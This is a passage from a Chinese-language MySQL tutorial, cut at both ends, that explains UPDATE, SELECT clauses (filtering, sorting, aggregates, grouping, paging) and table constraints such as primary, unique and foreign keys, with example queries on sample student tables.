修改数据</h2><ul><li>基本语法：update 表名 set 列名 1 = 值 1, 列明 2 = 值 2,…, 列明 n = 值 n [where 条件];<ul><li>将 stu 表内的 id 为 3 的 age 改为 117： <code>UPDATE stu SET age = 117 WHERE id = 3;</code></li><li>更改多条数据： <code>UPDATE stu SET age = 18, score = 100 WHERE id = 2;</code></li></ul></li><li>注意：<ol><li>如果不加任何条件，则会将表中所有记录全部修改</li></ol></li></ul><h1 id="7-dql查询表中的记录"><a class="markdownIt-Anchor" href="#7-dql查询表中的记录">#</a> 7、DQL：查询表中的记录</h1><ul><li>select * from 表名；</li></ul><h2 id="71-语法"><a class="markdownIt-Anchor" href="#71-语法">#</a> 7.1 语法</h2><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>select</p><p>​字段列表</p><p>from</p><p>​表名列表</p><p>where</p><p>​条件列表</p><p>group by</p><p>​分组字段</p><p>having</p><p>​分组之后的条件</p><p>order by</p><p>​排序</p><p>limit</p><p>​分页限定</p></blockquote><h2 id="72-基础查询"><a class="markdownIt-Anchor" href="#72-基础查询">#</a> 7.2 基础查询</h2><ol><li>查询多个字段：<strong>select 字段名 1, 字段名 2,… 字段名 n from 表名；</strong><ul><li>注意：如果查询所有字段，则可以使用 * 来替代字段列表</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查询姓名 和 年龄</span><span class="token keyword">SELECT</span> NAME<span class="token punctuation">,</span>age <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="2"><li>去除重复：<strong>select distinct 列名 1, 列明 2,… from 表名；</strong></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 去除重复的结果集</span><span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span> address <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span> NAME<span class="token punctuation">,</span>address <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token comment">#当查询多个字段时，只有两个字段组合的值相同了之后才会去重</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>计算列：一般可以使用四则运算来计算列的值，一般只会进行数值型的运算<ul><li>ifnull (表达式 1, 表达式 2)：null 参与的运算，计算结果都是 null<ul><li>表达式 1：哪个字段需要判断是否为 Null</li><li>表达式 2：该字段为 null 则替换后的值</li></ul></li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 计算math 和 English 分数之和</span><span class="token keyword">SELECT</span> NAME<span class="token punctuation">,</span>math<span class="token punctuation">,</span>english <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token keyword">SELECT</span> NAME<span class="token punctuation">,</span>math<span class="token punctuation">,</span>english<span class="token punctuation">,</span>math<span class="token operator">+</span>english <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token comment">-- 如果有null参与的运算,计算结果都为null</span><span class="token keyword">SELECT</span> NAME<span class="token punctuation">,</span>math<span class="token punctuation">,</span>english<span class="token punctuation">,</span>math<span class="token operator">+</span>IFNULL<span class="token punctuation">(</span>english<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token comment">-- ifnull(a,b)：如果a为null，替换为b</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>起别名：列名 as 重命名  或  列明 + 空格 + 重命名<ul><li>as 可以省略，用一个或多个空格代替</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 起别名</span><span class="token keyword">SELECT</span> NAME<span class="token punctuation">,</span>math<span class="token punctuation">,</span>english<span class="token punctuation">,</span>math<span class="token operator">+</span>IFNULL<span class="token punctuation">(</span>english<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token string">'总分'</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token keyword">SELECT</span> NAME<span class="token punctuation">,</span>math 数学<span class="token punctuation">,</span>english 英语<span class="token punctuation">,</span>math<span class="token operator">+</span>IFNULL<span class="token punctuation">(</span>english<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token string">'总分'</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="73-条件查询"><a class="markdownIt-Anchor" href="#73-条件查询">#</a> 7.3 条件查询</h2><ol><li>where 子句后跟条件</li><li>运算符<ul><li>&gt;、&lt;、&lt;=、&gt;=、=、&lt;&gt;</li><li>BETWEEN…AND</li><li>IN (集合)</li><li>LIKE ‘张 %’ ：模糊查询<ul><li>_：单个任意字符</li><li>%：多个任意字符</li></ul></li><li>IS NULL</li><li>and 或 &amp;&amp;</li><li>or 或 ||</li><li>not 或！</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查询年龄大于20岁</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> age <span class="token operator">>=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token comment">-- 查询年龄等于20岁</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> age <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token comment">-- 查询年龄不等于20岁</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> age <span class="token operator">!=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> age <span class="token operator">&lt;></span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token comment">-- 查询年龄大于等于20，小于等于30</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> age <span class="token operator">>=</span> <span class="token number">20</span> <span class="token operator">AND</span> age <span class="token operator">&lt;=</span> <span class="token number">30</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> age <span class="token operator">BETWEEN</span> <span class="token number">20</span> <span class="token operator">AND</span> <span class="token number">30</span><span class="token punctuation">;</span><span class="token comment">-- 查询年龄22岁，19岁，25岁的信息</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> age <span class="token operator">=</span> <span class="token number">22</span> <span class="token operator">OR</span> age <span class="token operator">=</span> <span class="token number">19</span> <span class="token operator">OR</span> age <span class="token operator">=</span> <span class="token number">25</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> age <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- 查询英语成绩为null （null值不能使用=判断，只能用is null）</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> english <span class="token operator">IS</span> <span class="token boolean">NULL</span><span class="token punctuation">;</span><span class="token comment">-- 查询英语成绩不为null</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> english <span class="token operator">IS</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">;</span><span class="token comment">-- 查询姓马的有哪些</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> NAME <span class="token operator">LIKE</span> <span class="token string">"马%"</span><span class="token punctuation">;</span><span class="token comment">-- 查询第二个字是化的人</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> NAME <span class="token operator">LIKE</span> <span class="token string">"_化%"</span><span class="token punctuation">;</span><span class="token comment">-- 查询姓名是三个字的人</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> NAME <span class="token operator">LIKE</span> <span class="token string">"___"</span><span class="token punctuation">;</span><span class="token comment">-- 查询姓名中包含马的人</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> NAME <span class="token operator">LIKE</span> <span class="token string">"%马%"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="74-排序查询"><a class="markdownIt-Anchor" href="#74-排序查询">#</a> 7.4 排序查询</h2><ul><li>语法：order by 字句<ul><li>order by 排序字段 1 排序方式 1, 排序字段 2 排序方式 2 …;</li></ul></li><li>排序方式<ul><li>ASC：升序，<strong>默认</strong></li><li>DESC：降序</li></ul></li><li>注意：<ul><li>如果有多个排序条件，则当前面的条件值一样时，才会判断第二条件</li></ul></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 按照数学成绩排序</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> math <span class="token keyword">ASC</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> math <span class="token keyword">DESC</span><span class="token punctuation">;</span><span class="token comment">-- 按照数学成绩排名，如果数学成绩一样，则按照英语成绩排名，都是升序</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> math <span class="token keyword">ASC</span><span class="token punctuation">,</span> english <span class="token keyword">ASC</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="75-聚合函数"><a class="markdownIt-Anchor" href="#75-聚合函数">#</a> 7.5 聚合函数</h2><ul><li>将一列数据作为一个整体，进行纵向的计算。<ol><li>count：计算个数<ol><li>一般选择非空的列：主键</li><li>count (*) —— 只要这一行数据有一个不为 null 就算作一个数据</li></ol></li><li>max：计算最大值</li><li>min：计算最小值</li><li>sum：计算和</li><li>avg：计算平均值</li></ol></li><li>注意：聚合函数的计算排除了 null 值<ul><li>解决方案：选择不包含空值的列进行计算，或使用<strong> IFNULL</strong> 函数进行计算</li></ul></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查询学生的人数</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>NAME<span class="token punctuation">)</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>IFNULL<span class="token punctuation">(</span>english<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token comment">-- 数学成绩的最大值和最小值</span><span class="token keyword">SELECT</span> <span class="token function">MAX</span><span class="token punctuation">(</span>math<span class="token punctuation">)</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token function">MIN</span><span class="token punctuation">(</span>math<span class="token punctuation">)</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token comment">-- 计算数学成绩的和</span><span class="token keyword">SELECT</span> <span class="token function">SUM</span><span class="token punctuation">(</span>math<span class="token punctuation">)</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token comment">-- 计算数学成绩的平均值</span><span class="token keyword">SELECT</span> <span class="token function">AVG</span><span class="token punctuation">(</span>math<span class="token punctuation">)</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="76-分组查询"><a class="markdownIt-Anchor" href="#76-分组查询">#</a> 7.6 分组查询</h2><ul><li>基本语法：<strong>group by 分组字段</strong></li><li>注意：<ol><li>分组之后查询的字段：<strong>分组字段、聚合函数</strong>，写其他字段没有任何意义</li><li>where 和 having 的区别：<ol><li>where 在分组之前进行限定，如果不满足这个条件则不参与分组。having 是在分组之后进行限定，如果不满足结果则不会被查询出来。</li><li>where 后<strong>不可以跟聚合函数</strong>，having<strong> 可以进行聚合函数的判断</strong></li></ol></li></ol></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 按照性别分组，分别查男女同学的平均分</span><span class="token keyword">SELECT</span> sex<span class="token punctuation">,</span><span class="token function">AVG</span><span class="token punctuation">(</span>math<span class="token punctuation">)</span> <span class="token keyword">FROM</span> student <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> sex<span class="token punctuation">;</span><span class="token comment">-- 按照性别分组，分别查男女同学的平均分、人数</span><span class="token keyword">SELECT</span> sex<span class="token punctuation">,</span><span class="token function">AVG</span><span class="token punctuation">(</span>math<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">COUNT</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">FROM</span> student <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> sex<span class="token punctuation">;</span><span class="token comment">-- 按照性别分组，分别查男女同学的平均分、人数,要求分数低于70分的不参与分组</span><span class="token keyword">SELECT</span> sex<span class="token punctuation">,</span><span class="token function">AVG</span><span class="token punctuation">(</span>math<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">COUNT</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> math <span class="token operator">></span> <span class="token number">70</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> sex<span class="token punctuation">;</span><span class="token comment">-- 按照性别分组，分别查男女同学的平均分、人数,要求分数低于70分的不参与分组,分组之后人数要大于两个人</span><span class="token keyword">SELECT</span> sex<span class="token punctuation">,</span><span class="token function">AVG</span><span class="token punctuation">(</span>math<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">COUNT</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> math <span class="token operator">></span> <span class="token number">70</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> sex <span class="token keyword">HAVING</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> sex<span class="token punctuation">,</span><span class="token function">AVG</span><span class="token punctuation">(</span>math<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">COUNT</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> 人数 <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> math <span class="token operator">></span> <span class="token number">70</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> sex <span class="token keyword">HAVING</span> 人数<span class="token operator">></span><span class="token number">2</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="77-分页查询"><a class="markdownIt-Anchor" href="#77-分页查询">#</a> 7.7 分页查询</h2><ul><li>基本语法：limit 开始的索引，每页查询的条数；</li><li>公式：*<em> 开始的索引 = （当前页码 - 1）<em>每页显示的条数</em></em></li><li>分页操作是一个<strong>方言</strong></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 每页显示3条记录 第一页</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token comment">-- 每页显示3条记录 第二页</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">LIMIT</span> <span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token comment">-- 每页显示3条记录 第三页</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">LIMIT</span> <span class="token number">6</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="8-约束"><a class="markdownIt-Anchor" href="#8-约束">#</a> 8、约束</h1><ul><li>概念：对表中的数据进行限定，保证数据的正确性、有效性和完整性</li><li>分类：<ol><li>主键约束：primary key</li><li>非空约束：not null</li><li>唯一约束：unique</li><li>外键约束：foreign key</li></ol></li></ul><h2 id="81-非空约束"><a class="markdownIt-Anchor" href="#81-非空约束">#</a> 8.1 非空约束</h2><ul><li><p>非空约束：not null</p><ol><li><p>在创建表的时候添加非空约束</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> stu <span class="token punctuation">(</span>    id <span class="token keyword">INT</span><span class="token punctuation">,</span>    NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- 删除name列的非空约束</span><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> stu <span class="token keyword">MODIFY</span> NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>创建完表后添加非空约束</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> stu <span class="token keyword">MODIFY</span> NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol></li></ul><h2 id="82-唯一约束"><a class="markdownIt-Anchor" href="#82-唯一约束">#</a> 8.2 唯一约束</h2><ul><li>唯一约束：unique，某一列的值不能重复</li><li>注意<ol><li>唯一约束可以有 null 值，但是只能有一条记录为 null</li></ol></li></ul><ol><li>在创建表的时候添加唯一约束</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 在创建表时添加唯一约束</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> stu<span class="token punctuation">(</span>id <span class="token keyword">INT</span><span class="token punctuation">,</span>phone_number <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token keyword">UNIQUE</span> <span class="token comment">-- 手机号</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>创建完表后添加唯一约束</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> stu <span class="token keyword">MODIFY</span> phone_number <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token keyword">UNIQUE</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>删除唯一约束</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> stu <span class="token keyword">DROP</span> <span class="token keyword">INDEX</span> phone_number<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="83-主键约束"><a class="markdownIt-Anchor" href="#83-主键约束">#</a> 8.3 主键约束</h2><ul><li>主键：primary key</li><li>注意<ol><li>含义：<strong>非空且唯一</strong></li><li>一张表中只能有一个主键，可以多个字段组成联合主键</li><li>主键就是表中记录的唯一标识</li></ol></li></ul><ol><li>在创建表时添加主键</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> stu <span class="token punctuation">(</span>id <span class="token keyword">INT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">,</span>NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>删除主键</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> stu <span class="token keyword">DROP</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>创建完表后添加主键</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> stu <span class="token keyword">MODIFY</span> id <span class="token keyword">INT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="84-主键约束-自动增长"><a class="markdownIt-Anchor" href="#84-主键约束-自动增长">#</a> 8.4 主键约束 - 自动增长</h2><ul><li>概念：如果某一列是数值类型的，使用 <strong>auto_increment</strong> 可以完成值的自动增长</li><li>注意<ol><li>自动增长的值只和上一条的值有关</li><li>自动增长一般会和主键联合使用</li><li>也可以不和主键一起用，但是用的很少</li></ol></li></ul><ol><li>在创建表时添加主键，并完成主键自增长</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> stu <span class="token punctuation">(</span>id <span class="token keyword">INT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">,</span>NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>删除自动增长</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> stu <span class="token keyword">MODIFY</span> id <span class="token keyword">INT</span><span class="token punctuation">;</span><span class="token comment">-- 这样不会删除主键，但是可以删除自动增长</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>创建表完成后添加自动增长</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> stu <span class="token keyword">MODIFY</span> id <span class="token keyword">INT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">;</span><span class="token comment">-- primaey key可加可不加</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="85-外键约束"><a class="markdownIt-Anchor" href="#85-外键约束">#</a> 8.5 外键约束</h2><ul><li>外键约束：foreign key，让表与表产生关系，从而保证数据的正确性</li></ul><ol><li>在创建表时添加外键</li></ol><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>语法：</p><p>create table 表名 (</p><p>​…</p><p>​外键列</p><p>​constraint 外键名称 foreign key 外键列 references 主表名称 (主表列名称);</p><p>)</p></blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> employee<span class="token punctuation">(</span>id <span class="token keyword">INT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">,</span>NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>age <span class="token keyword">INT</span><span class="token punctuation">,</span>dep_id <span class="token keyword">INT</span><span class="token punctuation">,</span> <span class="token comment">-- 外键对应主表的主键</span><span class="token keyword">CONSTRAINT</span> emp_dept_id <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>dep_id<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> department<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" 